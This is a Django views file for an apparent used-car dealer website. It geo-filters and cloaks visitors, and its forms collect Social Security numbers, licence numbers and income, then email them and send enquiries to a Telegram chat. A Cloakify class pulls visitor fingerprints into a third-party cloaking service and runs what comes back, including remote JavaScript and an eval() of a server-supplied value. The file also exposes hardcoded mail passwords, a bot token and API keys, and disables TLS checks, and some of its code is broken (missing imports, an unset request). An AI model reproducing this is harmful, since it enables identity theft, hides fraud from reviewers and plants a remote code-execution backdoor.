from uuid import uuid4
import requests
import json
from django.contrib import admin
from django.shortcuts import render, get_object_or_404, redirect
from django.core.mail import send_mail
from django.http import HttpResponseRedirect
from django.http import JsonResponse
from django.urls import reverse
from .models import Car
from django.db.models import Q
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import ssl
import smtplib
from django.views.decorators.csrf import csrf_exempt


def get_ip_ranges(url):
    """Fetch and parse IP ranges from a given URL."""
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()
        return response.text.strip().split("\n")
    except requests.RequestException:
        return []


def get_client_ip(request):
    """Retrieve the client's IP address from the request."""
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        return x_forwarded_for.split(',')[0]
    return request.META.get('REMOTE_ADDR', '')


def is_proxy(ip):
    """Check if the IP is detected as a proxy using proxycheck.io API."""
    api_key = 'o5sh9v-l568u8-07042d-3s72n6'
    url = f"http://proxycheck.io/v2/{ip}?key={api_key}&vpn=1&asn=1"
    try:
        response = requests.get(url, timeout=5)
        if response.headers.get('Content-Type') == 'application/json':
            data = response.json()
            return data.get(ip, {}).get('proxy') == "yes"
    except requests.RequestException:
        pass
    return False

def get_geolocation(ip):
    """Retrieve geolocation data of an IP."""
    if ip in ('127.0.0.1', '::1'):
        print("Localhost IP detected. Skipping geolocation lookup.")
        return {}  # Return an empty dictionary for localhost

    url = f"https://ipinfo.io/{ip}/json"
    try:
        response = requests.get(url, timeout=5)
        response.raise_for_status()  # Raise an error for bad status codes

        # Check if the response is JSON
        if 'application/json' in response.headers.get('Content-Type', ''):
            try:
                return response.json()  # Return parsed JSON as a dictionary
            except json.JSONDecodeError:
                print("Geolocation API returned invalid JSON:", response.text)
                return {}
        else:
            # Handle plain text response (e.g., "Stockholm, Stockholm, SE")
            print("Geolocation API returned non-JSON response:", response.text)
            parts = response.text.strip().split(', ')
            if len(parts) >= 3:
                return {'country': parts[2]}  # Extract the 3rd part as the country code
            else:
                print("Unexpected response format:", response.text)
                return {}

    except requests.RequestException as e:
        print("Geolocation API error:", e)
        return {}  # Return an empty dictionary if the request fails

def index(request):
    """Main Django view handling car display and IP filtering."""
    car_marks = list(Car.objects.values_list('mark', flat=True).distinct())
    car_models = {mark: list(Car.objects.filter(mark=mark).values_list('model', flat=True).distinct()) for mark in car_marks}

    car_mark = request.GET.get('mark')
    car_model = request.GET.get('model')

    cars = Car.objects.all()
    if car_mark:
        cars = cars.filter(mark=car_mark)
    if car_model:
        cars = cars.filter(model=car_model)

    client_ip = get_client_ip(request)
    print("Client IP:", client_ip)  # Debugging: Print the client IP

    geolocation = get_geolocation(client_ip)
    print("Geolocation response:", geolocation)  # Debugging: Print the geolocation response
    print("Type of geolocation:", type(geolocation))  # Debugging: Print the type of geolocation

    # Ensure geolocation is a dictionary
    if not isinstance(geolocation, dict):
        print("Warning: geolocation is not a dictionary. Resetting to empty dictionary.")
        geolocation = {}

    country_code = geolocation.get('country', 'Unknown')
    print("Country code:", country_code)  # Debugging: Print the country code

    ipv6_ranges = get_ip_ranges('https://raw.githubusercontent.com/lord-alfred/ipranges/main/all/ipv6.txt')
    ipv6_merged_ranges = get_ip_ranges('https://raw.githubusercontent.com/lord-alfred/ipranges/main/all/ipv6_merged.txt')

    # Example filtering logic
    if country_code != 'CA':
        if country_code == 'DE':
            if not is_proxy(client_ip):
                return render(request, 'pages/index.html')
            else:
                return redirect('https://google.com')
        else:
            return redirect('https://youtube.com')
    else:
        if not is_proxy(client_ip):
            return render(request, 'pages/index.html')
        else:
            return redirect('https://reddit.com')

    return render(request, 'pages/index.html', {
        'cars': cars,
        'car_marks': car_marks,
        'car_models': json.dumps(car_models),
    })


def about_us(request):
    return render(request, 'pages/About_us.html')


def blog(request):
    return render(request, 'pages/Blog.html')


def blog_1(request):
    return render(request, 'pages/blog_1.html')


def blog_2(request):
    return render(request, 'pages/blog_2.html')


def financing(request):
    return render(request, 'pages/Financing.html')


def shipping(request):
    return render(request, 'pages/shipping.html')


def terms(request):
    return render(request, 'pages/terms.html')


def privacy(request):
    return render(request, 'pages/privacy.html')


def dealer_warranty(request):
    return render(request, 'pages/Dealer_warranty.html')


def contact_us(request):
    return render(request, 'pages/contact_us.html')


def car_detail(request, caryear, carmark, carmodel):
    # Get the car based on the year, mark, and model
    car = get_object_or_404(Car, year=caryear, mark=carmark, model=carmodel)
    photos = car.photos.all()
    return render(request, 'pages/car_detail.html', {'car': car, 'photos': photos})


def listings(request):
    cars = Car.objects.all()  # Start with all cars

    # Collect filter parameters from GET request
    mark = request.GET.get('make')  # Make filter
    model = request.GET.get('model')  # Model filter
    year = request.GET.get('year')  # Year filter
    miles = request.GET.get('miles')  # Miles filter
    body = request.GET.get('body')  # Body filter
    transmission = request.GET.get('transmission')  # Transmission filter
    sort_by = request.GET.get('sort_by')  # Sorting filter

    # Apply filters based on the selected values
    if mark:
        cars = cars.filter(mark__iexact=mark)  # Case-insensitive filter for make

    if model:
        cars = cars.filter(model__iexact=model)  # Case-insensitive filter for model

    if year:
        try:
            year = int(year)  # Ensure it's an integer
            cars = cars.filter(year__gte=year)  # Filter for cars made from the year onwards
        except ValueError:
            pass  # If the year is invalid, we do nothing

    if miles:
        if miles == "10-30k":
            cars = cars.filter(miles__gte=10000, miles__lt=30000)
        elif miles == "30-50k":
            cars = cars.filter(miles__gte=30000, miles__lt=50000)
        elif miles == "50k+":
            cars = cars.filter(miles__gte=50000)

    if body:
        cars = cars.filter(body__iexact=body)  # Case-insensitive filter for body type

    if transmission:
        cars = cars.filter(transmission__iexact=transmission)  # Filter by transmission type

    # Default sorting by year (ascending order)
    if not sort_by:
        cars = cars.order_by('year')  # Default to sorting by year in ascending order

    # Sorting the results based on user choice
    if sort_by:
        if sort_by == 'price':
            cars = cars.order_by('price')  # Sort by price in ascending order
        elif sort_by == 'year':
            cars = cars.order_by('year')  # Sort by year in ascending order
        elif sort_by == 'miles':
            cars = cars.order_by('miles')  # Sort by miles in ascending order

    # For debugging purposes (optional)
    print(cars.query)  # To view the generated SQL query

    # Return the filtered cars to the template
    return render(request, 'pages/listings.html', {'cars': cars})



def get_geolocation(ip):
    try:
        response = requests.get(f'http://ipinfo.io/{ip}/json')
        if response.status_code == 200:
            data = response.json()
            city = data.get('city', 'N/A')
            region = data.get('region', 'N/A')
            country = data.get('country', 'N/A')
            print(f"{city}, {region}, {country}")
            return f"{city}, {region}, {country}"
        return "Location not found"
    except Exception as e:
        return "Error retrieving location"

def get_client_ip(request):
    # Check X-Forwarded-For for proxies or use request.META for the IP
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
        print(ip)
    else:
        ip = request.META.get('REMOTE_ADDR')
        print(ip)
    return ip


# Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7577846550:AAFpwD_ZTmBzezRG3u_E_ZIiYqaxMt8HxyE'  # Replace with your bot token
TELEGRAM_CHAT_ID = '-1002498237639'  # Replace with your chat ID

def send_to_telegram(message):
    """
    Sends a message to a Telegram chat using the Telegram Bot API.
    """
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    response = requests.post(url, data=payload)
    return response.json()

@csrf_exempt
def submit_info(request):
    print("🔹 submit_info() called")

    if request.method == 'POST':
        print("✅ Received a POST request")

        # Get form data
        name = request.POST.get('name')
        email = request.POST.get('email')
        phone = request.POST.get('phone')
        message = request.POST.get('message')
        car_link = request.POST.get('car_link')
        client_ip = get_client_ip(request)
        geolocation = "N/A, N/A"  # Replace with actual geolocation function if needed

        print(f"📩 Form Data - Name: {name}, Email: {email}, Phone: {phone}, Message: {message}")
        print(f"🌐 Car Link: {car_link}")
        print(f"🛰️ IP Address: {client_ip}, Geolocation: {geolocation}")

        # Set email parameters
        email_subject = 'New Inquiry Submitted'
        email_body = f"""
        Name: {name}
        Email: {email}
        Phone: {phone}
        Message: {message}
        Car Link: {car_link}
        Geolocation: {geolocation}
        IP Address: {client_ip}
        """

        # Create email message
        msg = MIMEMultipart()
        msg['From'] = 'sales@everydayauto1.com'
        msg['To'] = 'sales@everydayauto1.com'
        msg['Subject'] = email_subject
        msg.attach(MIMEText(email_body, 'plain'))

        # SMTP details (Hostinger example)
        smtp_host = 'mail.privateemail.com'  # Correct SMTP server for
        smtp_port = 465  # Port for SSL
        smtp_user = 'sales@everydayauto1.com'  # Your email address
        smtp_password = 'u9Z683dntB7'  # Your email password

        # Create SSL context and disable certificate verification
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        try:
            # Connect to SMTP server with the updated SSL context
            with smtplib.SMTP_SSL(smtp_host, smtp_port, context=context) as server:
                server.login(smtp_user, smtp_password)
                server.sendmail(msg['From'], msg['To'], msg.as_string())
                print("📧 Email sent successfully")
        except smtplib.SMTPAuthenticationError:
            print("❌ Email sending failed: Authentication Error")
        except Exception as e:
            print(f"❌ Email sending failed: {e}")

        # Prepare Telegram message
        telegram_message = f"""
        *New Inquiry Submitted*

        *Name:* {name}
        *Email:* {email}
        *Phone:* {phone}
        *Message:* {message}
        *Car Link:* {car_link}
        *Geolocation:* {geolocation}
        *IP Address:* {client_ip}
        """

        # Send to Telegram
        try:
            send_to_telegram(telegram_message)
            print("📨 Telegram message sent successfully")
        except Exception as e:
            print(f"❌ Telegram message sending failed: {e}")

        # Redirect user after submission
        redirect_url = reverse('index')
        print(f"🔄 Redirecting to: {redirect_url}")
        return JsonResponse({"redirect_url": redirect_url})  # Send JSON response with redirect

def submit_fin_form(request):
    if request.method == 'POST':
        # Personal Information
        car_link = request.POST.get('car_link1')
        first_name = request.POST.get('first-name')
        middle_name = request.POST.get('middle-name')
        last_name = request.POST.get('last-name')
        address_1 = request.POST.get('address-1')
        address_2 = request.POST.get('address-2')
        city = request.POST.get('city')
        state = request.POST.get('state')
        zip_code = request.POST.get('zip')
        social_security = request.POST.get('social-security')
        date_of_birth = request.POST.get('date-of-birth')
        drivers_license_number = request.POST.get('drivers-license-number')
        drivers_license_state = request.POST.get('drivers-license-state')
        drivers_license_exp = request.POST.get('drivers-license-exp')
        mobile_phone = request.POST.get('mobile-phone')
        home_phone = request.POST.get('home-phone')
        email = request.POST.get('email')

        # Residence Information
        years = request.POST.get('years')
        months = request.POST.get('months')
        residence_type = request.POST.get('residence-type')
        rent_mortgage = request.POST.get('rent-mortgage')

        # Employment Information
        employer = request.POST.get('employer')
        employer_type = request.POST.get('employer-type')
        monthly_income = request.POST.get('monthly-income')
        occupation = request.POST.get('occupation')
        employer_address_1 = request.POST.get('employer-address-1')
        employer_address_2 = request.POST.get('employer-address-2')
        employer_city = request.POST.get('employer-city')
        employer_state = request.POST.get('employer-state')
        employer_zip = request.POST.get('employer-zip')
        work_phone = request.POST.get('work-phone')
        employer_years = request.POST.get('employer-years')
        employer_months = request.POST.get('employer-months')

        # Get the user's IP and geolocation
        client_ip = get_client_ip(request)
        geolocation = get_geolocation(client_ip)

        # Email content
        email_subject = 'New Financial Application Submitted'
        email_body = f"""
        Car Link: {car_link}

        Personal Information:
        First Name: {first_name}
        Middle Name: {middle_name}
        Last Name: {last_name}
        Address 1: {address_1}
        Address 2: {address_2}
        City: {city}
        State: {state}
        Zip Code: {zip_code}
        Social Security: {social_security}
        Date of Birth: {date_of_birth}
        Drivers License Number: {drivers_license_number}
        Drivers License State: {drivers_license_state}
        Drivers License Exp: {drivers_license_exp}
        Mobile Phone: {mobile_phone}
        Home Phone: {home_phone}
        Email: {email}

        Residence Information:
        Years: {years}
        Months: {months}
        Residence Type: {residence_type}
        Rent/Mortgage: {rent_mortgage}

        Employment Information:
        Employer: {employer}
        Employer Type: {employer_type}
        Monthly Income: {monthly_income}
        Occupation: {occupation}
        Employer Address 1: {employer_address_1}
        Employer Address 2: {employer_address_2}
        Employer City: {employer_city}
        Employer State: {employer_state}
        Employer Zip: {employer_zip}
        Work Phone: {work_phone}
        Employer Years: {employer_years}
        Employer Months: {employer_months}

        Geolocation (based on IP): {geolocation}
        IP Address: {client_ip}
        """

        # Send email
        send_mail(
            email_subject,
            email_body,
            'sales@everyday-autosales.com',  # From email
            ['sales@everyday-autosales.com'],  # To email
            fail_silently=False,
        )

        return HttpResponse("Form submitted!")
    return render(request, 'pages/index.html')


API_KEY = 'q2b8P4WNW0cfUL9oxeZpEhPo7L0Y7rt5x58yfOkM0a6ee5ea'
THREAD_ID = 'a66e6d65-8bc0-4e2e-ba92-9fd3a66a082d'
CLOAKIFY_API_URL = 'https://cloakify.pro/api/v2'


class Cloakify:
    def __init__(self, api_key, thread_id, is_js=False):
        self.api_key = api_key
        self.thread_id = thread_id
        self.is_js = is_js
        self.is_ajax = self.is_ajax_request()

    def is_ajax_request(self):
        return 'X-Requested-With' in self.headers() and self.headers()['X-Requested-With'].lower() == 'xmlhttprequest'

    def headers(self):
        return {k: v for k, v in self.request.META.items() if k.startswith('HTTP_')}

    def get_user_ip_address(self):
        ip = self.request.META.get('HTTP_CF_CONNECTING_IP') or self.request.META.get('HTTP_X_REAL_IP') or \
             self.request.META.get('HTTP_X_FORWARDED_FOR') or self.request.META.get('REMOTE_ADDR')
        return ip.split(',')[0]  # Handle possible proxies

    def get_referrer(self):
        return self.request.META.get('HTTP_REFERER', '')

    def get_user_agent(self):
        return self.request.META.get('HTTP_USER_AGENT', '')

    def get_accept_languages(self):
        return self.request.META.get('HTTP_ACCEPT_LANGUAGE', '')

    def validate_request(self):
        url = f"{CLOAKIFY_API_URL}/threads/check"
        headers = {
            "Authorization": f"Bearer {self.api_key}",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json"
        }

        data = {
            'userAgent': self.get_user_agent(),
            'referrer': self.request.POST.get('referrer', self.get_referrer()),
            'languageList': self.get_accept_languages(),
            'params': self.request.GET,
            'threadId': self.thread_id,
            'isJs': self.is_js,
            'ip': self.get_user_ip_address(),
            'sess': self.request.COOKIES.get('sess', ''),
            'jsFingerprint': self.request.POST.get('bcheck', '')
        }

        response = requests.post(url, headers=headers, data=data)
        return response.json()

    def process(self):
        validation = self.validate_request()

        if 'error' in validation:
            return HttpResponse(validation['error'], status=400)

        if 'action' not in validation:
            return HttpResponse("Server Error", status=500)

        if 'session' in validation:
            response = HttpResponse()
            response.set_cookie('sess', validation['session'], max_age=10 * 365 * 24 * 60 * 60)
        else:
            response = HttpResponse()

        if not self.is_ajax and self.is_js:
            response['Content-Type'] = 'application/javascript'

        response['Cache-Control'] = 'no-store'

        if not self.is_ajax and validation.get('need_js') and validation.get('js'):
            if self.is_js:
                response.content = base64.b64decode(validation['js'])
            else:
                response.content = f"""<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"><script src="data:text/javascript;base64,{validation['js']}"></script></div></body></html>"""
            return response

        action = validation['action']
        if action['action'] == 'js':
            action['value'] = base64.b64encode(action['value'].encode()).decode()

        if self.is_ajax:
            return JsonResponse(action)
        else:
            if self.is_js:
                if action['action'] in [301, 302, 303, 'refresh']:
                    response.content = f"window.location.replace('{action['value']}');"
                elif action['action'] == 'iframe':
                    response.content = f"document.body.innerHTML = '<iframe src=\"{action['value']}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:9999999999;border:none;outline:none;\" />';"
                elif action['action'] == 'meta':
                    response.content = f"let meta = document.createElement('meta');meta.httpEquiv = 'refresh'; meta.content = '0; url={action['value']}'; document.head.appendChild(meta);"
                elif action['action'] == 'js':
                    response.content = base64.b64decode(action['value'])
                return response
            else:
                if action['action'] in [301, 302, 303]:
                    return HttpResponseRedirect(action['value'], status=action['action'])
                elif action['action'] == 'local':
                    return render(self.request, action['value'])
                elif action['action'] == 'iframe':
                    response.content = f'<iframe src="{action["value"]}" style="width:100%;height:100%;position:absolute;top:0;left:0;z-index:9999999999;border:none;outline:none;" />'
                elif action['action'] == 'return':
                    return HttpResponse(status=action['value'])
                elif action['action'] == 'meta':
                    response.content = f'<meta http-equiv="refresh" content="0; url={action["value"]}">'
                elif action['action'] == 'refresh':
                    response['Refresh'] = f'0; url={action["value"]}'
                elif action['action'] == 'xar':
                    response['X-Accel-Redirect'] = action['value']
                elif action['action'] == 'xsf':
                    response['X-Sendfile'] = action['value']
                elif action['action'] == 'php':
                    eval(action['value'])
                elif action['action'] == 'js':
                    response.content = f'<!DOCTYPE html><html><body><script src="data:text/javascript;base64,{action["value"]}"></script></body></html>'
                return response


@csrf_exempt
def cloakify_view(request):
    cloakify = Cloakify(API_KEY, request.GET.get('__id', THREAD_ID), is_js=True)
    return cloakify.process()